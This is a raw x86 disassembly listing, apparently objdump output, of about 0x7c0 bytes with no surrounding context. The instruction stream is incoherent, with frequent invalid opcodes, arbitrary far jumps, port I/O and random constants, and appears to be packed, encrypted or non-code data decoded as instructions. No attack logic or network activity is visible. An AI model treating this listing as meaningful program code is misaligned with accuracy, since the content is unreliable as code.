  413ea7:	scas   al,BYTE PTR es:[edi]
  413ea8:	jbe    0x413f13
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	mov    dh,0x24
  413ead:	outs   dx,DWORD PTR ds:[esi]
  413eae:	mov    edi,0xebe7efa9
  413eb3:	sub    ecx,ebp
  413eb5:	mov    bl,BYTE PTR [esi+0x5dfd2628]
  413ebb:	mov    edx,0x1162f60c
  413ec0:	dec    eax
  413ec1:	jnp    0x413eef
  413ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec4:	xor    eax,0xd348c60a
  413ec9:	jb     0x413e9d
  413ecb:	jo     0x413f2f
  413ecd:	mov    edx,0xa642c7d8
  413ed2:	and    edx,0xffffffba
  413ed5:	inc    esi
  413ed6:	div    DWORD PTR [ecx+0x43]
  413ed9:	mov    edi,0x24e8f960
  413ede:	sub    ebx,DWORD PTR [eax-0x13e3e94]
  413ee4:	mov    ds:0x93068ada,eax
  413ee9:	addr16 pushf 
  413eeb:	arpl   WORD PTR [ebx+0x5f],bx
  413eee:	cli    
  413eef:	mov    ch,0x5
  413ef1:	neg    BYTE PTR [edx-0x68]
  413ef4:	mov    ebx,0x3b063ba9
  413ef9:	mov    esi,DWORD PTR [edi+0x5a]
  413efc:	jp     0x413e97
  413efe:	fdivr  QWORD PTR [edx+ecx*1-0x771b5e45]
  413f05:	adc    DWORD PTR [ecx-0x2c],edx
  413f08:	pop    ds
  413f09:	fs add al,0xa1
  413f0c:	dec    esp
  413f0d:	or     DWORD PTR [edx+0x69],ecx
  413f10:	mov    bh,0x89
  413f12:	bound  eax,QWORD PTR [edi-0x2e]
  413f15:	jg     0x413eef
  413f17:	outs   dx,BYTE PTR ds:[esi]
  413f18:	shr    DWORD PTR [ecx-0x4],cl
  413f1b:	cmp    al,BYTE PTR [ebp+0x568168e9]
  413f21:	shl    BYTE PTR ds:0x2d022081,1
  413f27:	ins    BYTE PTR es:[edi],dx
  413f28:	loopne 0x413f03
  413f2a:	fstp   QWORD PTR [edx]
  413f2c:	inc    edi
  413f2d:	adc    al,0x8a
  413f2f:	push   eax
  413f30:	sahf   
  413f31:	mov    esi,0xbefd3f59
  413f36:	(bad)  
  413f37:	jle    0x413ed7
  413f39:	sub    al,0x31
  413f3b:	sbb    ch,ah
  413f3d:	aaa    
  413f3e:	inc    edi
  413f3f:	push   es
  413f40:	xor    eax,0x21cf0455
  413f45:	stos   BYTE PTR es:[edi],al
  413f46:	xor    eax,0x1674dab8
  413f4b:	bnd jb 0x413f6a
  413f4e:	aad    0x5c
  413f50:	cmp    ch,BYTE PTR [edi]
  413f52:	das    
  413f53:	jne    0x413fbb
  413f55:	cdq    
  413f56:	sub    bl,BYTE PTR [edx]
  413f58:	push   ds
  413f59:	pop    edi
  413f5a:	dec    esp
  413f5b:	xchg   edx,eax
  413f5c:	dec    eax
  413f5d:	mov    ds:0x398edf2d,al
  413f62:	cdq    
  413f63:	mov    cs:0x9245b7a4,eax
  413f69:	pop    ecx
  413f6a:	cmp    al,0x28
  413f6d:	fild   WORD PTR [ebx]
  413f6f:	data16 and al,0x87
  413f72:	lea    eax,ds:0x338b9611
  413f78:	and    edx,DWORD PTR [eax-0x4ffa9f8f]
  413f7e:	(bad)  
  413f7f:	call   0x71850e2f
  413f84:	mov    eax,0x66c0bf64
  413f89:	ror    DWORD PTR [edi-0x2b],1
  413f8c:	or     DWORD PTR [ecx+edi*8],ecx
  413f8f:	rcr    BYTE PTR [ebx],1
  413f91:	cld    
  413f92:	jmp    0xadd8:0xce1d1a98
  413f99:	mov    ds:0xa1f131d0,eax
  413f9e:	int3   
  413f9f:	test   eax,0xc6037593
  413fa4:	xor    eax,0xadb7472a
  413fa9:	into   
  413faa:	ja     0x413f5b
  413fac:	shr    DWORD PTR [ebx+0x617f446c],0x31
  413fb3:	push   es
  413fb4:	pandn  mm1,QWORD PTR [ebx+0xa]
  413fb8:	ffreep st(4)
  413fba:	mov    WORD PTR [ecx+edi*8+0x68],gs
  413fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fbf:	jno    0x413f6e
  413fc1:	fnstcw WORD PTR [eax]
  413fc3:	xchg   ecx,eax
  413fc4:	mov    al,0x3d
  413fc6:	jne    0x413fae
  413fc8:	dec    ebx
  413fc9:	fwait
  413fca:	pop    es
  413fcb:	popf   
  413fcc:	add    eax,0x9a7c2f9
  413fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fd2:	adc    BYTE PTR [edi-0x17da305e],cl
  413fd8:	popf   
  413fd9:	repnz out dx,eax
  413fdb:	add    esp,DWORD PTR [edi-0x57]
  413fde:	pop    ss
  413fdf:	adc    BYTE PTR [esi],bh
  413fe1:	pop    eax
  413fe2:	dec    ebx
  413fe3:	mov    eax,DWORD PTR [ecx]
  413fe5:	loope  0x41403a
  413fe7:	jg     0x413ff5
  413fe9:	adc    al,0x68
  413feb:	mov    ebx,DWORD PTR ds:0x82c13439
  413ff1:	mov    al,ds:0x446d6924
  413ff6:	rcr    esp,0x6d
  413ff9:	icebp  
  413ffa:	pushf  
  413ffb:	test   eax,0xb99b5d7e
  414000:	pop    edx
  414001:	sub    bl,bh
  414003:	dec    ecx
  414004:	xor    DWORD PTR [ebp-0x66],ebx
  414007:	(bad)  
  414008:	popa   
  414009:	mov    edi,0xbbe61b91
  41400e:	sbb    esi,DWORD PTR [ecx-0x29]
  414011:	mov    ebp,0x802cd97e
  414016:	cmp    esp,DWORD PTR ds:0x1cb1dbd9
  41401c:	pop    ebx
  41401d:	aad    0x9e
  41401f:	and    BYTE PTR [edi],0x7c
  414022:	push   cs
  414023:	cmp    eax,0xf622f297
  414028:	jmp    0x414044
  41402a:	jne    0x414069
  41402c:	ds mov bh,0xba
  41402f:	mov    ds,WORD PTR [esi+0x3c2cab39]
  414035:	xor    eax,0x5c612768
  41403a:	mov    ah,0x3a
  41403c:	lods   al,BYTE PTR ds:[esi]
  41403d:	push   ebp
  41403e:	out    dx,al
  41403f:	xor    esi,DWORD PTR [eax]
  414041:	ss scas al,BYTE PTR es:[edi]
  414043:	mov    eax,0x997e4ed2
  414048:	mov    edx,DWORD PTR [edi]
  41404a:	jl     0x41401c
  41404c:	leave  
  41404d:	xor    ebp,edx
  41404f:	jge    0x41401b
  414051:	loope  0x41401f
  414053:	xchg   edx,eax
  414054:	cmp    BYTE PTR [edx+ecx*2],ch
  414057:	jbe    0x414029
  414059:	fistp  DWORD PTR [ebx]
  41405b:	sub    ebp,DWORD PTR [edi+0x18]
  41405e:	mov    ah,0x71
  414060:	mov    eax,DWORD PTR [edi+0x369b60d1]
  414066:	(bad)  
  414069:	push   ebp
  41406a:	cs adc ch,cl
  41406d:	addr16 mov ds:0x5bc,al
  414071:	out    dx,eax
  414072:	fld    DWORD PTR [edx-0x6f1b6b71]
  414078:	rcr    DWORD PTR ds:0x9ccb1485,1
  41407e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41407f:	jg     0x4140f6
  414081:	mov    fs,WORD PTR [esi+0x27]
  414084:	cmp    al,0x86
  414086:	popf   
  414087:	or     al,0x74
  414089:	push   esp
  41408a:	outs   dx,BYTE PTR ds:[esi]
  41408b:	ja     0x414062
  41408d:	mov    ah,0x10
  41408f:	dec    esi
  414090:	and    DWORD PTR [esi-0x61bee1c8],eax
  414096:	and    DWORD PTR [edx+0x270b3ab7],esi
  41409c:	int    0x1a
  41409e:	cmp    al,0x63
  4140a0:	popa   
  4140a1:	dec    esp
  4140a2:	jmp    FWORD PTR [edx+eax*1]
  4140a5:	ins    DWORD PTR es:[edi],dx
  4140a6:	out    0x99,eax
  4140a8:	shl    DWORD PTR [edx],0xde
  4140ab:	jg     0x414102
  4140ad:	pop    esp
  4140ae:	sub    eax,0x6e69848c
  4140b3:	inc    eax
  4140b4:	dec    esi
  4140b5:	data16 js 0x4140de
  4140b8:	jnp    0x4140f8
  4140ba:	push   esi
  4140bb:	mov    bh,0x82
  4140bd:	shl    BYTE PTR cs:[eax+edx*2-0x10],1
  4140c2:	ror    DWORD PTR [esi],cl
  4140c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140c5:	xor    DWORD PTR [ecx+0xc],ebx
  4140c8:	ins    DWORD PTR es:[edi],dx
  4140c9:	cmp    al,0x6b
  4140cb:	test   al,0x48
  4140ce:	xchg   BYTE PTR [ebp-0x62e6034a],bl
  4140d4:	stc    
  4140d5:	call   0xe6bf:0xf64bfa7a
  4140dc:	(bad)  
  4140dd:	into   
  4140de:	dec    esp
  4140df:	jl     0x414129
  4140e1:	inc    esi
  4140e2:	repnz sbb esi,DWORD PTR [esi-0xa9bea35]
  4140e9:	jle    0x41409b
  4140eb:	sub    al,0x6e
  4140ed:	into   
  4140ee:	dec    edx
  4140ef:	jg     0x414130
  4140f1:	pusha  
  4140f2:	jge    0x4140ea
  4140f4:	std    
  4140f5:	fwait
  4140f6:	add    ebx,ebx
  4140f8:	ficom  DWORD PTR [eax+eax*4-0x3a]
  4140fc:	mov    WORD PTR [ebp+0x5b26c276],?
  414102:	mov    ds:0x83590432,eax
  414107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414108:	in     eax,dx
  414109:	stos   BYTE PTR es:[edi],al
  41410a:	add    eax,0xb38ff521
  41410f:	in     al,0x2c
  414111:	(bad)  
  414112:	push   eax
  414113:	sti    
  414114:	dec    edx
  414115:	cdq    
  414116:	adc    BYTE PTR [ebp-0x10],0xc7
  41411a:	jmp    0x97f8:0xc3f0cd1b
  414121:	or     DWORD PTR [edx-0x6cf66809],edi
  414127:	fmul   QWORD PTR [ebx]
  414129:	test   BYTE PTR [esp+ebp*2+0x7],dl
  41412d:	adc    cl,BYTE PTR [edx-0x18]
  414130:	int3   
  414131:	cmc    
  414132:	sahf   
  414133:	icebp  
  414134:	jmp    0x414138
  414136:	pop    esp
  414137:	xchg   ebp,eax
  414138:	dec    eax
  414139:	cmc    
  41413a:	fst    QWORD PTR [ecx+0x10]
  41413d:	jmp    0x9c03:0x5fc0ed39
  414144:	push   edi
  414145:	shr    cl,cl
  414147:	push   esi
  414148:	pop    eax
  414149:	or     eax,0x76b8f07a
  41414e:	dec    edx
  41414f:	mov    eax,0xbb913b93
  414154:	(bad)
  414158:	ficom  WORD PTR [edx+esi*4+0x768e5174]
  41415f:	add    al,0x1
  414161:	out    dx,eax
  414162:	arpl   si,dx
  414164:	les    esi,FWORD PTR [esi]
  414166:	add    BYTE PTR [ebp+0x6e53492],bh
  41416c:	stos   DWORD PTR es:[edi],eax
  41416d:	in     eax,dx
  41416e:	jae    0x4141d6
  414170:	test   BYTE PTR [edi-0x2],bh
  414173:	sar    BYTE PTR [eax],0x99
  414176:	test   eax,0xa5b0a958
  41417b:	adc    BYTE PTR [ebx-0x55],dl
  41417e:	fcomip st,st(1)
  414180:	call   0xfd41:0xca95444c
  414187:	aam    0xd8
  414189:	sub    al,0xbf
  41418b:	inc    edx
  41418c:	lods   al,BYTE PTR ds:[esi]
  41418d:	xor    BYTE PTR [edx+edx*2],0xbb
  414191:	push   esi
  414192:	call   0x530f0242
  414197:	pop    edx
  414198:	sub    BYTE PTR [esi+0x75585d5b],bl
  41419e:	es mov ah,0xe8
  4141a1:	push   esi
  4141a2:	adc    eax,0x69742918
  4141a7:	push   edi
  4141a8:	xchg   al,dh
  4141aa:	push   es
  4141ab:	mov    bl,0xd5
  4141ad:	jo     0x41415c
  4141af:	aad    0xe8
  4141b1:	xchg   BYTE PTR [esi+0x58d901f1],dh
  4141b7:	repnz add DWORD PTR [esi+0x374d4776],0x8afb7306
  4141c2:	les    esp,FWORD PTR [edx]
  4141c4:	je     0x414172
  4141c6:	pop    ss
  4141c7:	int3   
  4141c8:	bts    ebp,ecx
  4141cb:	cmc    
  4141cc:	cmc    
  4141cd:	fneni(8087 only) 
  4141cf:	fidiv  WORD PTR [ebx+0x57]
  4141d2:	jns    0x4141a1
  4141d4:	jae    0x4141bd
  4141d6:	mov    bl,0x45
  4141d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141d9:	xchg   edx,eax
  4141da:	mov    cl,BYTE PTR [ebx+0x29]
  4141dd:	int3   
  4141de:	ficomp WORD PTR [ecx+ecx*2+0x75]
  4141e2:	mov    eax,DWORD PTR [eax-0x49]
  4141e5:	mov    eax,ds:0xbd33bf50
  4141ea:	bound  ebx,QWORD PTR [edx-0x37]
  4141ed:	sub    eax,0x267d589a
  4141f2:	dec    esp
  4141f3:	int3   
  4141f4:	mov    al,ds:0xcae06fef
  4141f9:	sti    
  4141fa:	es data16 pushaw 
  4141fe:	fnop   
  414200:	xor    dh,BYTE PTR [ebx]
  414202:	loope  0x4141f0
  414204:	popa   
  414205:	mov    ebp,0xe9c26835
  41420a:	adc    edx,DWORD PTR [edi+0x6086e912]
  414210:	inc    eax
  414211:	sbb    eax,0xbb9cce95
  414216:	cmp    BYTE PTR [edi+ebp*1-0x7e],al
  41421a:	imul   edi,ecx,0x56
  41421d:	add    bl,bl
  41421f:	shr    BYTE PTR [eax+0x2d69f120],1
  414225:	jns    0x41420d
  414227:	jle    0x41423a
  414229:	pop    ds
  41422a:	sub    ebp,DWORD PTR [ecx]
  41422c:	jb     0x4142a6
  41422e:	dec    esp
  41422f:	pop    es
  414230:	ret    0x667
  414233:	sub    BYTE PTR [eax+ecx*8+0x787b112d],ah
  41423a:	sbb    dl,ah
  41423c:	inc    eax
  41423d:	test   al,0xc2
  41423f:	jle    0x414289
  414241:	inc    edi
  414242:	push   ds
  414243:	out    0x97,eax
  414245:	adc    ah,ah
  414247:	jmp    0x414297
  414249:	pop    esi
  41424a:	xchg   esp,eax
  41424b:	and    BYTE PTR [edx+esi*4+0x77],bh
  41424f:	push   cs
  414250:	imul   esi,edx,0xffffffb7
  414253:	jecxz  0x414253
  414255:	bound  esi,QWORD PTR cs:[esi+edx*4+0x445539a4]
  41425d:	mov    eax,0x3c7e8371
  414262:	lock test al,0x90
  414265:	mov    dl,0xd6
  414267:	jbe    0x41429e
  414269:	adc    BYTE PTR [edi+0x7d],0x50
  41426d:	in     al,dx
  41426e:	lahf   
  41426f:	inc    edx
  414270:	dec    ebx
  414271:	stos   BYTE PTR es:[edi],al
  414272:	repnz adc al,0x6e
  414275:	or     BYTE PTR [ebx-0x1f],al
  414278:	add    al,0x9d
  41427a:	das    
  41427b:	or     BYTE PTR [edi+0x56a667fd],dh
  414281:	cli    
  414282:	lea    edx,[esi-0x63b60c0c]
  414288:	mov    bh,0x54
  41428a:	and    al,0x53
  41428c:	inc    esp
  41428d:	adc    al,0x9
  41428f:	jecxz  0x41422c
  414291:	retf   
  414292:	add    DWORD PTR [esi-0x71a50521],ecx
  414298:	cmpps  xmm5,XMMWORD PTR [ecx],0x24
  41429c:	daa    
  41429d:	inc    ebp
  41429e:	mov    ch,0x61
  4142a0:	jo     0x414275
  4142a2:	out    0xea,eax
  4142a4:	push   0xffffff86
  4142a6:	repz push edx
  4142a8:	xlat   BYTE PTR ds:[ebx]
  4142a9:	sub    al,0xeb
  4142ab:	dec    ebp
  4142ac:	fild   WORD PTR [esi-0x19]
  4142af:	push   ecx
  4142b0:	lahf   
  4142b1:	mov    DWORD PTR [esp+edx*8+0x2b],edx
  4142b5:	nop
  4142b6:	pop    esi
  4142b7:	js     0x4142af
  4142b9:	jns    0x414294
  4142bb:	dec    edi
  4142bc:	cmp    al,0x82
  4142be:	push   eax
  4142bf:	cli    
  4142c0:	adc    al,0x83
  4142c2:	scas   al,BYTE PTR es:[edi]
  4142c3:	stos   DWORD PTR es:[edi],eax
  4142c4:	movd   mm0,DWORD PTR [ebx+ebp*1-0x30]
  4142c9:	shl    esi,1
  4142cb:	adc    DWORD PTR [eax-0x51],esi
  4142ce:	test   eax,0x5e1497e
  4142d3:	inc    ecx
  4142d4:	adc    DWORD PTR [ecx-0x7bca615b],edi
  4142da:	pop    ebp
  4142db:	std    
  4142dc:	loopne 0x41427c
  4142de:	cwde   
  4142df:	in     eax,dx
  4142e0:	stos   BYTE PTR es:[edi],al
  4142e1:	nop
  4142e2:	and    dh,BYTE PTR [ecx]
  4142e4:	rcl    BYTE PTR ds:0xe4159464,1
  4142ea:	pusha  
  4142eb:	call   0xc7a4:0xcd339dbb
  4142f2:	enter  0xb5f6,0x41
  4142f6:	mov    edi,0x2338417b
  4142fb:	jg     0x414309
  4142fd:	lods   eax,DWORD PTR ds:[esi]
  4142fe:	pop    ecx
  4142ff:	rcl    BYTE PTR [ebx],1
  414301:	push   ebx
  414302:	push   ds
  414303:	mov    edi,0x61a4e03
  414308:	aam    0x36
  41430a:	rcl    DWORD PTR [ebp-0xd],0xec
  41430e:	inc    eax
  41430f:	mov    ecx,0x6a3a5de4
  414314:	add    ch,BYTE PTR [eax+0x12]
  414317:	iret   
  414318:	sub    eax,DWORD PTR [eax]
  41431a:	xchg   ebp,eax
  41431b:	lea    ebp,[edi]
  41431d:	push   esi
  41431e:	dec    edx
  41431f:	pop    es
  414320:	pop    ds
  414321:	inc    eax
  414322:	mov    cl,0x17
  414324:	aam    0x7d
  414326:	(bad)  
  414328:	jmp    0x414323
  41432a:	cmp    al,0xd3
  41432c:	call   0xfc98:0x49a9b9de
  414333:	mov    bl,0xda
  414335:	inc    edx
  414336:	sub    BYTE PTR [edi],dh
  414338:	mul    ebx
  41433a:	cmp    esp,DWORD PTR [edi]
  41433c:	bnd jbe 0x4143ae
  41433f:	inc    ebp
  414340:	xor    eax,0xd6421c87
  414345:	adc    ah,BYTE PTR [esi+0x28855a2e]
  41434b:	mov    ebx,0xb52153dd
  414350:	sbb    DWORD PTR [ecx-0x3a13f6b5],0x10
  414357:	les    edi,FWORD PTR [ebp+0x13941bea]
  41435d:	and    ah,BYTE PTR [eax-0x73]
  414360:	aad    0x86
  414362:	and    DWORD PTR [esi],edx
  414364:	cmp    DWORD PTR [eax-0x7dd07751],ebp
  41436a:	cmp    bl,bl
  41436c:	dec    edi
  41436d:	sub    BYTE PTR [ebx-0x68],dl
  414370:	xchg   edi,eax
  414371:	std    
  414372:	fcmovb st,st(0)
  414374:	stc    
  414375:	sbb    al,0xf4
  414377:	imul   ebx,DWORD PTR [ecx],0x7f7475b3
  41437d:	jmp    0xcc26:0x3056237f
  414384:	push   esp
  414385:	call   0xe3d2:0x320e397a
  41438c:	mov    edi,0xc77b3143
  414391:	cs loope 0x4143c2
  414394:	pop    ds
  414395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414396:	ins    DWORD PTR es:[edi],dx
  414397:	hlt    
  414398:	add    eax,0x550cb15a
  41439d:	fdiv   DWORD PTR [eax+0x145d6dba]
  4143a3:	pop    edi
  4143a4:	mov    esp,cs
  4143a6:	mov    dl,0xee
  4143a8:	sub    BYTE PTR [ecx-0x480ecb42],dh
  4143ae:	lock pop edx
  4143b0:	scas   al,BYTE PTR es:[edi]
  4143b1:	imul   edi,DWORD PTR [eax],0x3f
  4143b4:	xchg   edx,eax
  4143b5:	mov    fs,esi
  4143b7:	pop    edi
  4143b8:	fld    DWORD PTR [edi+0x478b3820]
  4143be:	push   ebx
  4143bf:	jns    0x4143bc
  4143c1:	in     al,0x57
  4143c3:	jl     0x4143b2
  4143c5:	ins    DWORD PTR es:[edi],dx
  4143c6:	idiv   BYTE PTR [esi+edi*4]
  4143c9:	call   0xdc85:0xcb76e775
  4143d0:	sbb    BYTE PTR [eax+edx*4],dh
  4143d3:	cmp    ecx,edx
  4143d5:	out    0xda,eax
  4143d7:	sti    
  4143d8:	cmp    eax,0x2787d1d9
  4143dd:	scas   eax,DWORD PTR es:[edi]
  4143de:	and    DWORD PTR [ecx+0x70],0x73
  4143e2:	cmp    DWORD PTR gs:[edx+ebp*1],0x5a7bc09
  4143ea:	pop    eax
  4143eb:	dec    ecx
  4143ec:	loope  0x414402
  4143ee:	mov    ecx,0x6d82bf70
  4143f3:	or     eax,0x4e84741c
  4143f8:	add    ax,WORD PTR [esi-0x34]
  4143fc:	jne    0x4143fa
  4143fe:	es inc eax
  414400:	push   edx
  414401:	cmp    edi,DWORD PTR [edi-0x2a59ea9e]
  414407:	pop    ebx
  414408:	push   ecx
  414409:	out    dx,al
  41440a:	mov    esp,0x518bb18b
  41440f:	xor    dl,BYTE PTR [ebp-0x7bd78deb]
  414415:	xor    cl,ch
  414417:	sahf   
  414418:	adc    BYTE PTR [esp+edx*4],ah
  41441b:	sar    DWORD PTR [eax],cl
  41441d:	ret    0x7f26
  414420:	xor    DWORD PTR [edi],ebx
  414422:	test   eax,0x555f9839
  414427:	mov    bl,0x45
  414429:	mov    esi,esi
  41442b:	inc    ebp
  41442c:	mov    bl,bl
  41442e:	mov    ebx,0xc92759e
  414433:	int    0x18
  414435:	arpl   WORD PTR [ebx-0x3f236498],si
  41443b:	or     DWORD PTR [esp+eiz*8-0x75],edi
  41443f:	test   DWORD PTR [ebx],0xc0d41101
  414445:	ret    0xd6b6
  414448:	test   BYTE PTR cs:[ecx+ebx*1],bh
  41444c:	into   
  41444d:	mov    cs,edi
  41444f:	les    eax,FWORD PTR [ecx]
  414451:	and    dh,BYTE PTR [ebp-0x38]
  414454:	sub    al,0xfe
  414456:	cmp    ah,al
  414458:	xor    al,0xae
  41445a:	xchg   edi,eax
  41445b:	shl    DWORD PTR [eax+ebp*1-0x6997a8e7],0x89
  414463:	mov    dh,BYTE PTR [eax-0x1033a501]
  414469:	add    esi,DWORD PTR [ebx+0x7a123e6]
  41446f:	or     ebp,edi
  414471:	fdiv   QWORD PTR [ebx+0x15]
  414474:	cs loope 0x4144c2
  414477:	(bad)
  41447a:	mov    ecx,0x7288f22b
  41447f:	(bad)  
  414480:	mov    dh,0xab
  414482:	imul   ecx,DWORD PTR [ebx+0xd8e2e8e],0x8691dd1f
  41448c:	jmp    ebp
  41448e:	cwde   
  41448f:	jo     0x4144da
  414491:	mov    BYTE PTR [eax+ecx*1-0x5b],ah
  414495:	mov    es,ecx
  414497:	stc    
  414498:	push   0x24ee45cc
  41449d:	jle    0x414508
  41449f:	add    BYTE PTR [eax],ah
  4144a1:	arpl   di,sp
  4144a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144a4:	mov    ebp,DWORD PTR [edi-0x4]
  4144a7:	and    eax,0x2b251b6c
  4144ac:	dec    esp
  4144ad:	out    0x6d,eax
  4144af:	psubd  mm4,QWORD PTR [esi]
  4144b2:	shl    dh,1
  4144b4:	fnstenv [eax-0x1d]
  4144b7:	sub    al,0xb3
  4144b9:	in     al,0x81
  4144bb:	fcmovu st,st(3)
  4144bd:	jae    0x414491
  4144bf:	xchg   edi,eax
  4144c0:	xor    ebx,edi
  4144c2:	lahf   
  4144c3:	sub    eax,DWORD PTR [ebx]
  4144c5:	outs   dx,DWORD PTR ds:[esi]
  4144c6:	push   edi
  4144c7:	sbb    al,0x44
  4144c9:	cmp    ebp,DWORD PTR [ebp+0x53c9b1fe]
  4144cf:	and    DWORD PTR [eax+0x687a15e3],edx
  4144d5:	or     dl,bl
  4144d7:	mov    cl,0x24
  4144d9:	mov    dh,0xe9
  4144db:	(bad)  
  4144dd:	lods   eax,DWORD PTR ds:[esi]
  4144de:	or     al,0x36
  4144e0:	pop    ebp
  4144e1:	mov    dh,0xfe
  4144e3:	jp     0x4144f0
  4144e5:	adc    BYTE PTR ds:0xc293c807,bl
  4144eb:	pop    ebx
  4144ec:	fwait
  4144ed:	push   ecx
  4144ee:	inc    esi
  4144ef:	xor    DWORD PTR [ecx-0xe0451b3],0xb5423020
  4144f9:	jns    0x414540
  4144fb:	dec    DWORD PTR ds:0xf43ceb6f
  414501:	jbe    0x4144d7
  414503:	xlat   BYTE PTR ds:[ebx]
  414504:	inc    esi
  414505:	stc    
  414506:	adc    DWORD PTR [ecx+0x2c],ebp
  414509:	scas   eax,DWORD PTR es:[edi]
  41450a:	xchg   esp,eax
  41450b:	loop   0x414561
  41450d:	fwait
  41450e:	test   DWORD PTR [ebp+0x40],esi
  414511:	ror    DWORD PTR [ebx],0x5e
  414514:	test   eax,0x70fd25de
  414519:	outs   dx,DWORD PTR ds:[esi]
  41451a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41451b:	dec    ecx
  41451c:	xchg   edi,eax
  41451d:	mov    cl,0x1d
  41451f:	rol    DWORD PTR [edi],1
  414521:	mov    ch,0xd1
  414523:	xchg   DWORD PTR [ebp+eiz*2+0xa],eax
  414527:	retf   0x7aa9
  41452a:	lahf   
  41452b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41452c:	rol    BYTE PTR [ebx+ebx*2],0xd9
  414530:	mov    al,ds:0xb0e7a3ef
  414535:	inc    edx
  414536:	rcr    DWORD PTR [bp-0x2d],cl
  41453a:	dec    dh
  41453c:	jbe    0x4145a8
  41453e:	scas   al,BYTE PTR es:[edi]
  41453f:	jmp    0x5c8:0x98d87fe6
  414546:	sbb    DWORD PTR [ebx+0x68],0xffffffff
  41454a:	mov    edi,0x4e72b060
  41454f:	adc    DWORD PTR [edx+0x46],eax
  414552:	xor    al,0xb4
  414554:	dec    ecx
  414555:	ret    0xa7f7
  414558:	dec    eax
  414559:	setl   BYTE PTR [ebp*2-0x14bf0b7c]
  414561:	stos   DWORD PTR es:[edi],eax
  414562:	dec    ecx
  414563:	aam    0x18
  414565:	stos   BYTE PTR es:[edi],al
  414566:	aaa    
  414567:	mov    edx,0x733ffe15
  41456c:	dec    eax
  41456d:	xor    al,0x42
  41456f:	inc    ecx
  414570:	shl    eax,0x6f
  414573:	sbb    edx,DWORD PTR [esp+esi*1+0x62]
  414577:	(bad)  
  414578:	jb     0x4145aa
  41457a:	(bad)  [edx]
  41457c:	jb     0x414503
  41457e:	xor    DWORD PTR ds:0x9f096a9,edx
  414584:	jnp    0x414588
  414586:	sub    DWORD PTR [esi-0x59],edx
  414589:	pusha  
  41458a:	dec    esp
  41458b:	(bad)  
  41458c:	fist   DWORD PTR [edx]
  41458e:	out    0x77,eax
  414590:	stc    
  414591:	test   DWORD PTR [ecx-0x67],edi
  414594:	mov    ds:0x471ad15b,al
  414599:	jb     0x414613
  41459b:	pop    esp
  41459c:	add    bh,BYTE PTR [ebp+edx*8-0x1b]
  4145a0:	leave  
  4145a1:	xchg   DWORD PTR [ebp-0x76dfb8f],ebp
  4145a7:	pushf  
  4145a8:	out    0x83,eax
  4145aa:	pop    esp
  4145ab:	adc    eax,0xf3874595
  4145b0:	mov    ds:0xd0689460,eax
  4145b5:	lahf   
  4145b6:	cmp    BYTE PTR [edx+0x1df85a5b],ah
  4145bc:	sbb    ebp,DWORD PTR [edx]
  4145be:	aaa    
  4145bf:	sbb    DWORD PTR [edi+0x20],0xe7fb66d8
  4145c6:	mov    ss,WORD PTR [edx-0x48]
  4145c9:	push   eax
  4145ca:	push   cs
  4145cb:	xor    eax,0xae30ff41
  4145d0:	mov    dh,0x34
  4145d2:	in     al,dx
  4145d3:	pop    edx
  4145d4:	cdq    
  4145d5:	pop    ss
  4145d6:	cmovge ecx,DWORD PTR [ebx-0x3e]
  4145da:	iret   
  4145db:	inc    esp
  4145dc:	pop    esi
  4145dd:	dec    ebp
  4145de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145df:	sbb    al,BYTE PTR [ecx+0x6517ae48]
  4145e5:	push   esp
  4145e6:	xor    al,BYTE PTR [ebx]
  4145e8:	hlt    
  4145e9:	xor    dl,BYTE PTR [ebx-0x5b5995f0]
  4145ef:	lahf   
  4145f0:	sbb    eax,esp
  4145f2:	data16 mov dl,0xbd
  4145f5:	fstp   st(2)
  4145f7:	inc    ecx
  4145f8:	push   cs
  4145f9:	loope  0x414638
  4145fb:	bound  eax,QWORD PTR [edx+0x47]
  4145fe:	enter  0x1e1c,0x57
  414602:	xchg   esi,eax
  414603:	mov    bh,0x3d
  414605:	loop   0x4145a1
  414607:	jecxz  0x4145e6
  414609:	xchg   edx,eax
  41460a:	hlt    
  41460b:	outs   dx,DWORD PTR ds:[esi]
  41460c:	xchg   edi,eax
  41460d:	mov    dh,0x48
  41460f:	push   ecx
  414610:	mov    ecx,DWORD PTR [eax+0x1]
  414613:	addr16 mov ds:0x208c,al
  414617:	push   ebx
  414618:	pop    ds
  414619:	lock daa 
  41461b:	xchg   edx,eax
  41461c:	xchg   ecx,eax
  41461d:	sub    DWORD PTR [eax-0x27a6a4ac],esi
  414623:	mov    ah,dh
  414625:	mov    DWORD PTR [esi],ebp
  414627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414628:	ins    DWORD PTR es:[edi],dx
  414629:	dec    ebp
  41462a:	adc    edi,DWORD PTR [ebx+0xf9d8d2d]
  414630:	int    0x75
  414632:	outs   dx,DWORD PTR ds:[esi]
  414633:	xchg   esi,eax
  414634:	test   al,0xf5
  414636:	loopne 0x41465e
  414638:	ins    BYTE PTR es:[edi],dx
  414639:	rcr    BYTE PTR [esi+ebx*1],1
  41463c:	sub    BYTE PTR [edi+0x7],al
  41463f:	shl    DWORD PTR [ecx+0x5d],cl
  414642:	aad    0x0
  414644:	push   0xffffffee
  414646:	add    cl,BYTE PTR [edi+eiz*8+0x17]
  41464a:	repnz mov eax,0x69e5c607
  414650:	jmp    0x414603
  414652:	cmp    edx,ebx
  414654:	mov    al,ds:0x71bf01cb
  414659:	aam    0xe7
  41465b:	xlat   BYTE PTR ds:[ebx]
  41465c:	xchg   edx,eax
  41465d:	sbb    ah,BYTE PTR [edx]
  41465f:	jb     0x41469a
  414661:	hlt    
  414662:	shl    BYTE PTR [edi+0x1e],0x9c
  414666:	fwait
  414667:	inc    ebp
  414668:	add    eax,0xd3e9c86a
